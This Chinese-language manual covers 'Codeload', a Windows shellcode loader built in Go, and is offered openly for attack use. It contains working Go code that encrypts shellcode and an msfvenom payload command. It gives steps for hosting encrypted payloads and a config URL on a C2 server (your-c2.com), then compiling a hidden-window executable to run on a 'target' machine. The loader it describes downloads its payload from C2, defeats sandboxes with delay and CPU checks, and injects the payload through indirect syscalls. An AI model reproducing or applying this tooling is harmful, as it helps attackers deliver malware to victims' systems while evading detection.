# Codeload 使用手册

本指南介绍了 Codeload 的 Payload 生成、编译和部署流程。

## 1. 环境设置

确保您的开发机器上安装了 Go（推荐使用 Linux/macOS 进行交叉编译）。

```bash
go version
# 应该为 go1.20+
```

## 2. Payload 准备

Codeload 要求 Shellcode 必须使用 **ChaCha20-Poly1305** 以特定格式进行加密。由于加载器期望密钥 (Key) 和随机数 (Nonce) 嵌入在 Payload 数据块中，您必须使用以下工具来加密您的 Shellcode。

### 加密工具 (`encryptor.go`)

将以下代码保存为 `encryptor.go`：

```go
package main

import (
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"io"
	"log"
	"os"

	"golang.org/x/crypto/chacha20poly1305"
)

func main() {
	if len(os.Args) < 3 {
		fmt.Println("Usage: go run encryptor.go <raw_shellcode.bin> <output.bin>")
		return
	}

	inputPath := os.Args[1]
	outputPath := os.Args[2]

	// 1. 读取原始 Shellcode
	shellcode, err := os.ReadFile(inputPath)
	if err != nil {
		log.Fatalf("Failed to read shellcode: %v", err)
	}

	// 2. 准备明文结构
	// 结构: [Padding (512 bytes)] [Real Size (4 bytes)] [Shellcode]
	padding := make([]byte, 512)
	if _, err := rand.Read(padding); err != nil {
		log.Fatalf("Failed to generate padding: %v", err)
	}

	realSize := make([]byte, 4)
	binary.BigEndian.PutUint32(realSize, uint32(len(shellcode)))

	plaintext := append(padding, realSize...)
	plaintext = append(plaintext, shellcode...)

	// 3. 生成 Key 和 Nonce
	key := make([]byte, chacha20poly1305.KeySize)
	if _, err := rand.Read(key); err != nil {
		log.Fatalf("Failed to generate key: %v", err)
	}

	nonce := make([]byte, chacha20poly1305.NonceSize)
	if _, err := rand.Read(nonce); err != nil {
		log.Fatalf("Failed to generate nonce: %v", err)
	}

	// 4. 加密
	aead, err := chacha20poly1305.New(key)
	if err != nil {
		log.Fatalf("Failed to create cipher: %v", err)
	}

	ciphertext := aead.Seal(nil, nonce, plaintext, nil)

	// 5. 构建最终数据块
	// 格式: [Nonce] [Ciphertext] [Key]
	finalBlob := append(nonce, ciphertext...)
	finalBlob = append(finalBlob, key...)

	// 6. 写入输出文件
	if err := os.WriteFile(outputPath, finalBlob, 0644); err != nil {
		log.Fatalf("Failed to write output: %v", err)
	}

	fmt.Printf("[+] Encrypted payload saved to %s\n", outputPath)
	fmt.Printf("[+] Original Size: %d bytes\n", len(shellcode))
	fmt.Printf("[+] Final Blob Size: %d bytes\n", len(finalBlob))
}
```

### 生成 Payload

1.  生成原始 Shellcode（例如，使用 Cobalt Strike 或 Metasploit）。
    ```bash
    # 示例: msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o shellcode.bin
    ```
2.  运行加密工具：
    ```bash
    go run encryptor.go shellcode.bin payload.enc
    ```
3.  将 `payload.enc` 上传到您的 C2 服务器（例如 `http://your-c2.com/files/payload.enc`）。

## 3. 配置

1.  创建一个文本文件（例如 `config.txt`），其中**仅**包含指向您加密 Payload 的 URL。
    ```text
    http://your-c2.com/files/payload.enc
    ```
2.  将 `config.txt` 上传到您的 C2 服务器（例如 `http://your-c2.com/config.txt`）。
3.  编辑 Codeload 源码中的 `main.go`：
    ```go
    var (
        configURL = "http://your-c2.com/config.txt"
    )
    ```

## 4. 编译

为 Windows x64 编译加载器。

```bash
# 安装依赖
go mod tidy

# 编译
GOOS=windows GOARCH=amd64 go build -ldflags "-s -w -H=windowsgui" -o codeload.exe
```

## 5. 执行

将 `codeload.exe` 传输到目标 Windows 机器并执行。

```powershell
.\codeload.exe
```

加载器将执行以下操作：
1.  验证环境检查（如果运行时间过短则等待 10 分钟）。
2.  连接到 `configURL` 获取 Payload 的位置。
3.  下载并解密 Payload。
4.  使用 Fiber/Indirect-Syscall 技术注入并执行 Payload。

---
**故障排除**:
*   如果程序立即退出，可能是因为未能通过环境检查（运行时间 < 10 分钟，< 2 个 CPU 核心）。
*   检查到 C2 服务器的网络连接。
